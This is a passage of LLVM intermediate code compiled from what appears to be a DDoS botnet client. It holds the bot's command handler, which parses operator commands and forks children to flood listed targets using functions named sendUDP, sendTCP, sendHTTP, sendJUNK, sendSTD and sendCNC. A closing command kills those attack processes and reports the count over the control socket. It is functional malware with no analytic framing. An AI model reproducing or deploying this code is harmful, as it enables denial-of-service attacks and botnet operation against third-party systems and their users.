  br i1 %176, label %183, label %177

177:                                              ; preds = %171
  %178 = load i8**, i8*** %4, align 8
  %179 = getelementptr inbounds i8*, i8** %178, i64 3
  %180 = load i8*, i8** %179, align 8
  %181 = call i32 @atoi(i8* %180) #11
  %182 = icmp slt i32 %181, 1
  br i1 %182, label %183, label %184

183:                                              ; preds = %177, %171, %168
  br label %721

184:                                              ; preds = %177
  %185 = load i8**, i8*** %4, align 8
  %186 = getelementptr inbounds i8*, i8** %185, i64 1
  %187 = load i8*, i8** %186, align 8
  store i8* %187, i8** %9, align 8
  %188 = load i8**, i8*** %4, align 8
  %189 = getelementptr inbounds i8*, i8** %188, i64 2
  %190 = load i8*, i8** %189, align 8
  %191 = call i32 @atoi(i8* %190) #11
  store i32 %191, i32* %10, align 4
  %192 = load i8**, i8*** %4, align 8
  %193 = getelementptr inbounds i8*, i8** %192, i64 3
  %194 = load i8*, i8** %193, align 8
  %195 = call i32 @atoi(i8* %194) #11
  store i32 %195, i32* %11, align 4
  %196 = load i8*, i8** %9, align 8
  %197 = call i8* @strstr(i8* %196, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #11
  %198 = icmp ne i8* %197, null
  br i1 %198, label %199, label %217

199:                                              ; preds = %184
  %200 = load i8*, i8** %9, align 8
  %201 = call i8* @strtok(i8* %200, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #12
  store i8* %201, i8** %12, align 8
  br label %202

202:                                              ; preds = %214, %199
  %203 = load i8*, i8** %12, align 8
  %204 = icmp ne i8* %203, null
  br i1 %204, label %205, label %216

205:                                              ; preds = %202
  %206 = call i32 @listFork()
  %207 = icmp ne i32 %206, 0
  br i1 %207, label %214, label %208

208:                                              ; preds = %205
  %209 = load i8*, i8** %12, align 8
  %210 = load i32, i32* %10, align 4
  %211 = load i32, i32* %11, align 4
  call void @sendJUNK(i8* %209, i32 %210, i32 %211)
  %212 = load i32, i32* @mainCommSock, align 4
  %213 = call i32 @close(i32 %212)
  call void @_exit(i32 0) #14
  unreachable

214:                                              ; preds = %205
  %215 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #12
  store i8* %215, i8** %12, align 8
  br label %202, !llvm.loop !40

216:                                              ; preds = %202
  br label %225

217:                                              ; preds = %184
  %218 = call i32 @listFork()
  %219 = icmp ne i32 %218, 0
  br i1 %219, label %220, label %221

220:                                              ; preds = %217
  br label %721

221:                                              ; preds = %217
  %222 = load i8*, i8** %9, align 8
  %223 = load i32, i32* %10, align 4
  %224 = load i32, i32* %11, align 4
  call void @sendJUNK(i8* %222, i32 %223, i32 %224)
  call void @_exit(i32 0) #14
  unreachable

225:                                              ; preds = %216
  br label %721

226:                                              ; preds = %162
  %227 = load i8**, i8*** %4, align 8
  %228 = getelementptr inbounds i8*, i8** %227, i64 0
  %229 = load i8*, i8** %228, align 8
  %230 = call i32 @strcmp(i8* %229, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.120, i64 0, i64 0)) #11
  %231 = icmp ne i32 %230, 0
  br i1 %231, label %375, label %232

232:                                              ; preds = %226
  %233 = load i32, i32* %3, align 4
  %234 = icmp slt i32 %233, 6
  br i1 %234, label %286, label %235

235:                                              ; preds = %232
  %236 = load i8**, i8*** %4, align 8
  %237 = getelementptr inbounds i8*, i8** %236, i64 3
  %238 = load i8*, i8** %237, align 8
  %239 = call i32 @atoi(i8* %238) #11
  %240 = icmp eq i32 %239, -1
  br i1 %240, label %286, label %241

241:                                              ; preds = %235
  %242 = load i8**, i8*** %4, align 8
  %243 = getelementptr inbounds i8*, i8** %242, i64 2
  %244 = load i8*, i8** %243, align 8
  %245 = call i32 @atoi(i8* %244) #11
  %246 = icmp eq i32 %245, -1
  br i1 %246, label %286, label %247

247:                                              ; preds = %241
  %248 = load i8**, i8*** %4, align 8
  %249 = getelementptr inbounds i8*, i8** %248, i64 4
  %250 = load i8*, i8** %249, align 8
  %251 = call i32 @atoi(i8* %250) #11
  %252 = icmp eq i32 %251, -1
  br i1 %252, label %286, label %253

253:                                              ; preds = %247
  %254 = load i8**, i8*** %4, align 8
  %255 = getelementptr inbounds i8*, i8** %254, i64 5
  %256 = load i8*, i8** %255, align 8
  %257 = call i32 @atoi(i8* %256) #11
  %258 = icmp eq i32 %257, -1
  br i1 %258, label %286, label %259

259:                                              ; preds = %253
  %260 = load i8**, i8*** %4, align 8
  %261 = getelementptr inbounds i8*, i8** %260, i64 5
  %262 = load i8*, i8** %261, align 8
  %263 = call i32 @atoi(i8* %262) #11
  %264 = icmp sgt i32 %263, 65536
  br i1 %264, label %286, label %265

265:                                              ; preds = %259
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds i8*, i8** %266, i64 5
  %268 = load i8*, i8** %267, align 8
  %269 = call i32 @atoi(i8* %268) #11
  %270 = icmp sgt i32 %269, 65500
  br i1 %270, label %286, label %271

271:                                              ; preds = %265
  %272 = load i8**, i8*** %4, align 8
  %273 = getelementptr inbounds i8*, i8** %272, i64 4
  %274 = load i8*, i8** %273, align 8
  %275 = call i32 @atoi(i8* %274) #11
  %276 = icmp sgt i32 %275, 32
  br i1 %276, label %286, label %277

277:                                              ; preds = %271
  %278 = load i32, i32* %3, align 4
  %279 = icmp eq i32 %278, 7
  br i1 %279, label %280, label %287

280:                                              ; preds = %277
  %281 = load i8**, i8*** %4, align 8
  %282 = getelementptr inbounds i8*, i8** %281, i64 6
  %283 = load i8*, i8** %282, align 8
  %284 = call i32 @atoi(i8* %283) #11
  %285 = icmp slt i32 %284, 1
  br i1 %285, label %286, label %287

286:                                              ; preds = %280, %271, %265, %259, %253, %247, %241, %235, %232
  br label %721

287:                                              ; preds = %280, %277
  %288 = load i8**, i8*** %4, align 8
  %289 = getelementptr inbounds i8*, i8** %288, i64 1
  %290 = load i8*, i8** %289, align 8
  store i8* %290, i8** %13, align 8
  %291 = load i8**, i8*** %4, align 8
  %292 = getelementptr inbounds i8*, i8** %291, i64 2
  %293 = load i8*, i8** %292, align 8
  %294 = call i32 @atoi(i8* %293) #11
  store i32 %294, i32* %14, align 4
  %295 = load i8**, i8*** %4, align 8
  %296 = getelementptr inbounds i8*, i8** %295, i64 3
  %297 = load i8*, i8** %296, align 8
  %298 = call i32 @atoi(i8* %297) #11
  store i32 %298, i32* %15, align 4
  %299 = load i8**, i8*** %4, align 8
  %300 = getelementptr inbounds i8*, i8** %299, i64 4
  %301 = load i8*, i8** %300, align 8
  %302 = call i32 @atoi(i8* %301) #11
  store i32 %302, i32* %16, align 4
  %303 = load i8**, i8*** %4, align 8
  %304 = getelementptr inbounds i8*, i8** %303, i64 5
  %305 = load i8*, i8** %304, align 8
  %306 = call i32 @atoi(i8* %305) #11
  store i32 %306, i32* %17, align 4
  %307 = load i32, i32* %3, align 4
  %308 = icmp sgt i32 %307, 6
  br i1 %308, label %309, label %314

309:                                              ; preds = %287
  %310 = load i8**, i8*** %4, align 8
  %311 = getelementptr inbounds i8*, i8** %310, i64 6
  %312 = load i8*, i8** %311, align 8
  %313 = call i32 @atoi(i8* %312) #11
  br label %315

314:                                              ; preds = %287
  br label %315

315:                                              ; preds = %314, %309
  %316 = phi i32 [ %313, %309 ], [ 1000, %314 ]
  store i32 %316, i32* %18, align 4
  %317 = load i32, i32* %3, align 4
  %318 = icmp sgt i32 %317, 7
  br i1 %318, label %319, label %324

319:                                              ; preds = %315
  %320 = load i8**, i8*** %4, align 8
  %321 = getelementptr inbounds i8*, i8** %320, i64 7
  %322 = load i8*, i8** %321, align 8
  %323 = call i32 @atoi(i8* %322) #11
  br label %325

324:                                              ; preds = %315
  br label %325

325:                                              ; preds = %324, %319
  %326 = phi i32 [ %323, %319 ], [ 1000000, %324 ]
  store i32 %326, i32* %19, align 4
  %327 = load i32, i32* %3, align 4
  %328 = icmp sgt i32 %327, 8
  br i1 %328, label %329, label %334

329:                                              ; preds = %325
  %330 = load i8**, i8*** %4, align 8
  %331 = getelementptr inbounds i8*, i8** %330, i64 8
  %332 = load i8*, i8** %331, align 8
  %333 = call i32 @atoi(i8* %332) #11
  br label %335

334:                                              ; preds = %325
  br label %335

335:                                              ; preds = %334, %329
  %336 = phi i32 [ %333, %329 ], [ 0, %334 ]
  store i32 %336, i32* %20, align 4
  %337 = load i8*, i8** %13, align 8
  %338 = call i8* @strstr(i8* %337, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #11
  %339 = icmp ne i8* %338, null
  br i1 %339, label %340, label %361

340:                                              ; preds = %335
  %341 = load i8*, i8** %13, align 8
  %342 = call i8* @strtok(i8* %341, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #12
  store i8* %342, i8** %21, align 8
  br label %343

343:                                              ; preds = %358, %340
  %344 = load i8*, i8** %21, align 8
  %345 = icmp ne i8* %344, null
  br i1 %345, label %346, label %360

346:                                              ; preds = %343
  %347 = call i32 @listFork()
  %348 = icmp ne i32 %347, 0
  br i1 %348, label %358, label %349

349:                                              ; preds = %346
  %350 = load i8*, i8** %21, align 8
  %351 = load i32, i32* %14, align 4
  %352 = load i32, i32* %15, align 4
  %353 = load i32, i32* %16, align 4
  %354 = load i32, i32* %17, align 4
  %355 = load i32, i32* %18, align 4
  %356 = load i32, i32* %19, align 4
  %357 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %350, i32 %351, i32 %352, i32 %353, i32 %354, i32 %355, i32 %356, i32 %357)
  call void @_exit(i32 0) #14
  unreachable

358:                                              ; preds = %346
  %359 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #12
  store i8* %359, i8** %21, align 8
  br label %343, !llvm.loop !41

360:                                              ; preds = %343
  br label %374

361:                                              ; preds = %335
  %362 = call i32 @listFork()
  %363 = icmp ne i32 %362, 0
  br i1 %363, label %373, label %364

364:                                              ; preds = %361
  %365 = load i8*, i8** %13, align 8
  %366 = load i32, i32* %14, align 4
  %367 = load i32, i32* %15, align 4
  %368 = load i32, i32* %16, align 4
  %369 = load i32, i32* %17, align 4
  %370 = load i32, i32* %18, align 4
  %371 = load i32, i32* %19, align 4
  %372 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %365, i32 %366, i32 %367, i32 %368, i32 %369, i32 %370, i32 %371, i32 %372)
  call void @_exit(i32 0) #14
  unreachable

373:                                              ; preds = %361
  br label %374

374:                                              ; preds = %373, %360
  br label %721

375:                                              ; preds = %226
  %376 = load i8**, i8*** %4, align 8
  %377 = getelementptr inbounds i8*, i8** %376, i64 0
  %378 = load i8*, i8** %377, align 8
  %379 = call i32 @strcmp(i8* %378, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.121, i64 0, i64 0)) #11
  %380 = icmp ne i32 %379, 0
  br i1 %380, label %502, label %381

381:                                              ; preds = %375
  %382 = load i32, i32* %3, align 4
  %383 = icmp slt i32 %382, 6
  br i1 %383, label %426, label %384

384:                                              ; preds = %381
  %385 = load i8**, i8*** %4, align 8
  %386 = getelementptr inbounds i8*, i8** %385, i64 3
  %387 = load i8*, i8** %386, align 8
  %388 = call i32 @atoi(i8* %387) #11
  %389 = icmp eq i32 %388, -1
  br i1 %389, label %426, label %390

390:                                              ; preds = %384
  %391 = load i8**, i8*** %4, align 8
  %392 = getelementptr inbounds i8*, i8** %391, i64 2
  %393 = load i8*, i8** %392, align 8
  %394 = call i32 @atoi(i8* %393) #11
  %395 = icmp eq i32 %394, -1
  br i1 %395, label %426, label %396

396:                                              ; preds = %390
  %397 = load i8**, i8*** %4, align 8
  %398 = getelementptr inbounds i8*, i8** %397, i64 4
  %399 = load i8*, i8** %398, align 8
  %400 = call i32 @atoi(i8* %399) #11
  %401 = icmp eq i32 %400, -1
  br i1 %401, label %426, label %402

402:                                              ; preds = %396
  %403 = load i8**, i8*** %4, align 8
  %404 = getelementptr inbounds i8*, i8** %403, i64 4
  %405 = load i8*, i8** %404, align 8
  %406 = call i32 @atoi(i8* %405) #11
  %407 = icmp sgt i32 %406, 32
  br i1 %407, label %426, label %408

408:                                              ; preds = %402
  %409 = load i32, i32* %3, align 4
  %410 = icmp sgt i32 %409, 6
  br i1 %410, label %411, label %417

411:                                              ; preds = %408
  %412 = load i8**, i8*** %4, align 8
  %413 = getelementptr inbounds i8*, i8** %412, i64 6
  %414 = load i8*, i8** %413, align 8
  %415 = call i32 @atoi(i8* %414) #11
  %416 = icmp slt i32 %415, 0
  br i1 %416, label %426, label %417

417:                                              ; preds = %411, %408
  %418 = load i32, i32* %3, align 4
  %419 = icmp eq i32 %418, 8
  br i1 %419, label %420, label %427

420:                                              ; preds = %417
  %421 = load i8**, i8*** %4, align 8
  %422 = getelementptr inbounds i8*, i8** %421, i64 7
  %423 = load i8*, i8** %422, align 8
  %424 = call i32 @atoi(i8* %423) #11
  %425 = icmp slt i32 %424, 1
  br i1 %425, label %426, label %427

426:                                              ; preds = %420, %411, %402, %396, %390, %384, %381
  br label %721

427:                                              ; preds = %420, %417
  %428 = load i8**, i8*** %4, align 8
  %429 = getelementptr inbounds i8*, i8** %428, i64 1
  %430 = load i8*, i8** %429, align 8
  store i8* %430, i8** %22, align 8
  %431 = load i8**, i8*** %4, align 8
  %432 = getelementptr inbounds i8*, i8** %431, i64 2
  %433 = load i8*, i8** %432, align 8
  %434 = call i32 @atoi(i8* %433) #11
  store i32 %434, i32* %23, align 4
  %435 = load i8**, i8*** %4, align 8
  %436 = getelementptr inbounds i8*, i8** %435, i64 3
  %437 = load i8*, i8** %436, align 8
  %438 = call i32 @atoi(i8* %437) #11
  store i32 %438, i32* %24, align 4
  %439 = load i8**, i8*** %4, align 8
  %440 = getelementptr inbounds i8*, i8** %439, i64 4
  %441 = load i8*, i8** %440, align 8
  %442 = call i32 @atoi(i8* %441) #11
  store i32 %442, i32* %25, align 4
  %443 = load i8**, i8*** %4, align 8
  %444 = getelementptr inbounds i8*, i8** %443, i64 5
  %445 = load i8*, i8** %444, align 8
  store i8* %445, i8** %26, align 8
  %446 = load i32, i32* %3, align 4
  %447 = icmp eq i32 %446, 8
  br i1 %447, label %448, label %453

448:                                              ; preds = %427
  %449 = load i8**, i8*** %4, align 8
  %450 = getelementptr inbounds i8*, i8** %449, i64 7
  %451 = load i8*, i8** %450, align 8
  %452 = call i32 @atoi(i8* %451) #11
  br label %454

453:                                              ; preds = %427
  br label %454

454:                                              ; preds = %453, %448
  %455 = phi i32 [ %452, %448 ], [ 10, %453 ]
  store i32 %455, i32* %27, align 4
  %456 = load i32, i32* %3, align 4
  %457 = icmp sgt i32 %456, 6
  br i1 %457, label %458, label %463

458:                                              ; preds = %454
  %459 = load i8**, i8*** %4, align 8
  %460 = getelementptr inbounds i8*, i8** %459, i64 6
  %461 = load i8*, i8** %460, align 8
  %462 = call i32 @atoi(i8* %461) #11
  br label %464

463:                                              ; preds = %454
  br label %464

464:                                              ; preds = %463, %458
  %465 = phi i32 [ %462, %458 ], [ 0, %463 ]
  store i32 %465, i32* %28, align 4
  %466 = load i8*, i8** %22, align 8
  %467 = call i8* @strstr(i8* %466, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #11
  %468 = icmp ne i8* %467, null
  br i1 %468, label %469, label %489

469:                                              ; preds = %464
  %470 = load i8*, i8** %22, align 8
  %471 = call i8* @strtok(i8* %470, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #12
  store i8* %471, i8** %29, align 8
  br label %472

472:                                              ; preds = %486, %469
  %473 = load i8*, i8** %29, align 8
  %474 = icmp ne i8* %473, null
  br i1 %474, label %475, label %488

475:                                              ; preds = %472
  %476 = call i32 @listFork()
  %477 = icmp ne i32 %476, 0
  br i1 %477, label %486, label %478

478:                                              ; preds = %475
  %479 = load i8*, i8** %29, align 8
  %480 = load i32, i32* %23, align 4
  %481 = load i32, i32* %24, align 4
  %482 = load i32, i32* %25, align 4
  %483 = load i8*, i8** %26, align 8
  %484 = load i32, i32* %28, align 4
  %485 = load i32, i32* %27, align 4
  call void @sendTCP(i8* %479, i32 %480, i32 %481, i32 %482, i8* %483, i32 %484, i32 %485)
  call void @_exit(i32 0) #14
  unreachable

486:                                              ; preds = %475
  %487 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #12
  store i8* %487, i8** %29, align 8
  br label %472, !llvm.loop !42

488:                                              ; preds = %472
  br label %501

489:                                              ; preds = %464
  %490 = call i32 @listFork()
  %491 = icmp ne i32 %490, 0
  br i1 %491, label %500, label %492

492:                                              ; preds = %489
  %493 = load i8*, i8** %22, align 8
  %494 = load i32, i32* %23, align 4
  %495 = load i32, i32* %24, align 4
  %496 = load i32, i32* %25, align 4
  %497 = load i8*, i8** %26, align 8
  %498 = load i32, i32* %28, align 4
  %499 = load i32, i32* %27, align 4
  call void @sendTCP(i8* %493, i32 %494, i32 %495, i32 %496, i8* %497, i32 %498, i32 %499)
  call void @_exit(i32 0) #14
  unreachable

500:                                              ; preds = %489
  br label %501

501:                                              ; preds = %500, %488
  br label %721

502:                                              ; preds = %375
  %503 = load i8**, i8*** %4, align 8
  %504 = getelementptr inbounds i8*, i8** %503, i64 0
  %505 = load i8*, i8** %504, align 8
  %506 = call i32 @strcmp(i8* %505, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.122, i64 0, i64 0)) #11
  %507 = icmp ne i32 %506, 0
  br i1 %507, label %556, label %508

508:                                              ; preds = %502
  %509 = load i32, i32* %3, align 4
  %510 = icmp slt i32 %509, 4
  br i1 %510, label %523, label %511

511:                                              ; preds = %508
  %512 = load i8**, i8*** %4, align 8
  %513 = getelementptr inbounds i8*, i8** %512, i64 2
  %514 = load i8*, i8** %513, align 8
  %515 = call i32 @atoi(i8* %514) #11
  %516 = icmp slt i32 %515, 1
  br i1 %516, label %523, label %517

517:                                              ; preds = %511
  %518 = load i8**, i8*** %4, align 8
  %519 = getelementptr inbounds i8*, i8** %518, i64 3
  %520 = load i8*, i8** %519, align 8
  %521 = call i32 @atoi(i8* %520) #11
  %522 = icmp slt i32 %521, 1
  br i1 %522, label %523, label %524

523:                                              ; preds = %517, %511, %508
  br label %721

524:                                              ; preds = %517
  %525 = load i8**, i8*** %4, align 8
  %526 = getelementptr inbounds i8*, i8** %525, i64 1
  %527 = load i8*, i8** %526, align 8
  store i8* %527, i8** %30, align 8
  %528 = load i8**, i8*** %4, align 8
  %529 = getelementptr inbounds i8*, i8** %528, i64 2
  %530 = load i8*, i8** %529, align 8
  %531 = call i32 @atoi(i8* %530) #11
  store i32 %531, i32* %31, align 4
  %532 = load i8**, i8*** %4, align 8
  %533 = getelementptr inbounds i8*, i8** %532, i64 3
  %534 = load i8*, i8** %533, align 8
  %535 = call i32 @atoi(i8* %534) #11
  store i32 %535, i32* %32, align 4
  %536 = load i8*, i8** %30, align 8
  %537 = call i8* @strstr(i8* %536, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #11
  %538 = icmp ne i8* %537, null
  br i1 %538, label %539, label %551

539:                                              ; preds = %524
  %540 = load i8*, i8** %30, align 8
  %541 = call i8* @strtok(i8* %540, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #12
  store i8* %541, i8** %33, align 8
  br label %542

542:                                              ; preds = %545, %539
  %543 = load i8*, i8** %33, align 8
  %544 = icmp ne i8* %543, null
  br i1 %544, label %545, label %550

545:                                              ; preds = %542
  %546 = load i8*, i8** %33, align 8
  %547 = load i32, i32* %31, align 4
  %548 = load i32, i32* %32, align 4
  call void @sendHTTP(i8* %546, i32 %547, i32 %548)
  %549 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #12
  store i8* %549, i8** %33, align 8
  br label %542, !llvm.loop !43

550:                                              ; preds = %542
  br label %555

551:                                              ; preds = %524
  %552 = load i8*, i8** %30, align 8
  %553 = load i32, i32* %31, align 4
  %554 = load i32, i32* %32, align 4
  call void @sendHTTP(i8* %552, i32 %553, i32 %554)
  br label %555

555:                                              ; preds = %551, %550
  br label %721

556:                                              ; preds = %502
  %557 = load i8**, i8*** %4, align 8
  %558 = getelementptr inbounds i8*, i8** %557, i64 0
  %559 = load i8*, i8** %558, align 8
  %560 = call i32 @strcmp(i8* %559, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.123, i64 0, i64 0)) #11
  %561 = icmp ne i32 %560, 0
  br i1 %561, label %620, label %562

562:                                              ; preds = %556
  %563 = load i32, i32* %3, align 4
  %564 = icmp slt i32 %563, 4
  br i1 %564, label %577, label %565

565:                                              ; preds = %562
  %566 = load i8**, i8*** %4, align 8
  %567 = getelementptr inbounds i8*, i8** %566, i64 2
  %568 = load i8*, i8** %567, align 8
  %569 = call i32 @atoi(i8* %568) #11
  %570 = icmp slt i32 %569, 1
  br i1 %570, label %577, label %571

571:                                              ; preds = %565
  %572 = load i8**, i8*** %4, align 8
  %573 = getelementptr inbounds i8*, i8** %572, i64 3
  %574 = load i8*, i8** %573, align 8
  %575 = call i32 @atoi(i8* %574) #11
  %576 = icmp slt i32 %575, 1
  br i1 %576, label %577, label %578

577:                                              ; preds = %571, %565, %562
  br label %721

578:                                              ; preds = %571
  %579 = load i8**, i8*** %4, align 8
  %580 = getelementptr inbounds i8*, i8** %579, i64 1
  %581 = load i8*, i8** %580, align 8
  store i8* %581, i8** %34, align 8
  %582 = load i8**, i8*** %4, align 8
  %583 = getelementptr inbounds i8*, i8** %582, i64 2
  %584 = load i8*, i8** %583, align 8
  %585 = call i32 @atoi(i8* %584) #11
  store i32 %585, i32* %35, align 4
  %586 = load i8**, i8*** %4, align 8
  %587 = getelementptr inbounds i8*, i8** %586, i64 3
  %588 = load i8*, i8** %587, align 8
  %589 = call i32 @atoi(i8* %588) #11
  store i32 %589, i32* %36, align 4
  %590 = load i8*, i8** %34, align 8
  %591 = call i8* @strstr(i8* %590, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #11
  %592 = icmp ne i8* %591, null
  br i1 %592, label %593, label %611

593:                                              ; preds = %578
  %594 = load i8*, i8** %34, align 8
  %595 = call i8* @strtok(i8* %594, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #12
  store i8* %595, i8** %37, align 8
  br label %596

596:                                              ; preds = %608, %593
  %597 = load i8*, i8** %37, align 8
  %598 = icmp ne i8* %597, null
  br i1 %598, label %599, label %610

599:                                              ; preds = %596
  %600 = call i32 @listFork()
  %601 = icmp ne i32 %600, 0
  br i1 %601, label %608, label %602

602:                                              ; preds = %599
  %603 = load i8*, i8** %37, align 8
  %604 = load i32, i32* %35, align 4
  %605 = load i32, i32* %36, align 4
  call void @sendCNC(i8* %603, i32 %604, i32 %605)
  %606 = load i32, i32* @mainCommSock, align 4
  %607 = call i32 @close(i32 %606)
  call void @_exit(i32 0) #14
  unreachable

608:                                              ; preds = %599
  %609 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #12
  store i8* %609, i8** %37, align 8
  br label %596, !llvm.loop !44

610:                                              ; preds = %596
  br label %619

611:                                              ; preds = %578
  %612 = call i32 @listFork()
  %613 = icmp ne i32 %612, 0
  br i1 %613, label %614, label %615

614:                                              ; preds = %611
  br label %721

615:                                              ; preds = %611
  %616 = load i8*, i8** %34, align 8
  %617 = load i32, i32* %35, align 4
  %618 = load i32, i32* %36, align 4
  call void @sendCNC(i8* %616, i32 %617, i32 %618)
  call void @_exit(i32 0) #14
  unreachable

619:                                              ; preds = %610
  br label %721

620:                                              ; preds = %556
  %621 = load i8**, i8*** %4, align 8
  %622 = getelementptr inbounds i8*, i8** %621, i64 0
  %623 = load i8*, i8** %622, align 8
  %624 = call i32 @strcmp(i8* %623, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.124, i64 0, i64 0)) #11
  %625 = icmp ne i32 %624, 0
  br i1 %625, label %674, label %626

626:                                              ; preds = %620
  %627 = load i32, i32* %3, align 4
  %628 = icmp slt i32 %627, 4
  br i1 %628, label %641, label %629

629:                                              ; preds = %626
  %630 = load i8**, i8*** %4, align 8
  %631 = getelementptr inbounds i8*, i8** %630, i64 2
  %632 = load i8*, i8** %631, align 8
  %633 = call i32 @atoi(i8* %632) #11
  %634 = icmp slt i32 %633, 1
  br i1 %634, label %641, label %635

635:                                              ; preds = %629
  %636 = load i8**, i8*** %4, align 8
  %637 = getelementptr inbounds i8*, i8** %636, i64 3
  %638 = load i8*, i8** %637, align 8
  %639 = call i32 @atoi(i8* %638) #11
  %640 = icmp slt i32 %639, 1
  br i1 %640, label %641, label %642

641:                                              ; preds = %635, %629, %626
  br label %721

642:                                              ; preds = %635
  %643 = load i8**, i8*** %4, align 8
  %644 = getelementptr inbounds i8*, i8** %643, i64 1
  %645 = load i8*, i8** %644, align 8
  store i8* %645, i8** %38, align 8
  %646 = load i8**, i8*** %4, align 8
  %647 = getelementptr inbounds i8*, i8** %646, i64 2
  %648 = load i8*, i8** %647, align 8
  %649 = call i32 @atoi(i8* %648) #11
  store i32 %649, i32* %39, align 4
  %650 = load i8**, i8*** %4, align 8
  %651 = getelementptr inbounds i8*, i8** %650, i64 3
  %652 = load i8*, i8** %651, align 8
  %653 = call i32 @atoi(i8* %652) #11
  store i32 %653, i32* %40, align 4
  %654 = load i8*, i8** %38, align 8
  %655 = call i8* @strstr(i8* %654, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #11
  %656 = icmp ne i8* %655, null
  br i1 %656, label %657, label %669

657:                                              ; preds = %642
  %658 = load i8*, i8** %38, align 8
  %659 = call i8* @strtok(i8* %658, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #12
  store i8* %659, i8** %41, align 8
  br label %660

660:                                              ; preds = %663, %657
  %661 = load i8*, i8** %41, align 8
  %662 = icmp ne i8* %661, null
  br i1 %662, label %663, label %668

663:                                              ; preds = %660
  %664 = load i8*, i8** %41, align 8
  %665 = load i32, i32* %39, align 4
  %666 = load i32, i32* %40, align 4
  call void @sendSTD(i8* %664, i32 %665, i32 %666)
  %667 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #12
  store i8* %667, i8** %41, align 8
  br label %660, !llvm.loop !45

668:                                              ; preds = %660
  br label %673

669:                                              ; preds = %642
  %670 = load i8*, i8** %38, align 8
  %671 = load i32, i32* %39, align 4
  %672 = load i32, i32* %40, align 4
  call void @sendSTD(i8* %670, i32 %671, i32 %672)
  br label %673

673:                                              ; preds = %669, %668
  br label %721

674:                                              ; preds = %620
  %675 = load i8**, i8*** %4, align 8
  %676 = getelementptr inbounds i8*, i8** %675, i64 0
  %677 = load i8*, i8** %676, align 8
  %678 = call i32 @strcmp(i8* %677, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.125, i64 0, i64 0)) #11
  %679 = icmp ne i32 %678, 0
  br i1 %679, label %721, label %680

680:                                              ; preds = %674
  store i32 0, i32* %42, align 4
  store i64 0, i64* %43, align 8
  br label %681

681:                                              ; preds = %707, %680
  %682 = load i64, i64* %43, align 8
  %683 = load i64, i64* @numpids, align 8
  %684 = icmp ult i64 %682, %683
  br i1 %684, label %685, label %710

685:                                              ; preds = %681
  %686 = load i32*, i32** @pids, align 8
  %687 = load i64, i64* %43, align 8
  %688 = getelementptr inbounds i32, i32* %686, i64 %687
  %689 = load i32, i32* %688, align 4
  %690 = icmp ne i32 %689, 0
  br i1 %690, label %691, label %706

691:                                              ; preds = %685
  %692 = load i32*, i32** @pids, align 8
  %693 = load i64, i64* %43, align 8
  %694 = getelementptr inbounds i32, i32* %692, i64 %693
  %695 = load i32, i32* %694, align 4
  %696 = call i32 @getpid() #12
  %697 = icmp ne i32 %695, %696
  br i1 %697, label %698, label %706

698:                                              ; preds = %691
  %699 = load i32*, i32** @pids, align 8
  %700 = load i64, i64* %43, align 8
  %701 = getelementptr inbounds i32, i32* %699, i64 %700
  %702 = load i32, i32* %701, align 4
  %703 = call i32 @kill(i32 %702, i32 9) #12
  %704 = load i32, i32* %42, align 4
  %705 = add nsw i32 %704, 1
  store i32 %705, i32* %42, align 4
  br label %706

706:                                              ; preds = %698, %691, %685
  br label %707

707:                                              ; preds = %706
  %708 = load i64, i64* %43, align 8
  %709 = add i64 %708, 1
  store i64 %709, i64* %43, align 8
  br label %681, !llvm.loop !46

710:                                              ; preds = %681
  %711 = load i32, i32* %42, align 4
  %712 = icmp sgt i32 %711, 0
  br i1 %712, label %713, label %717

713:                                              ; preds = %710
  %714 = load i32, i32* @mainCommSock, align 4
  %715 = load i32, i32* %42, align 4
  %716 = call i32 (i32, i8*, ...) @sockprintf(i32 %714, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.126, i64 0, i64 0), i32 %715)
  br label %720

717:                                              ; preds = %710
  %718 = load i32, i32* @mainCommSock, align 4
  %719 = call i32 (i32, i8*, ...) @sockprintf(i32 %718, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.127, i64 0, i64 0))
  br label %720

720:                                              ; preds = %717, %713
  br label %721

721:                                              ; preds = %49, %88, %95, %121, %156, %161, %183, %220, %225, %286, %374, %426, %501, %523, %555, %577, %614, %619, %641, %673, %720, %674
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #10

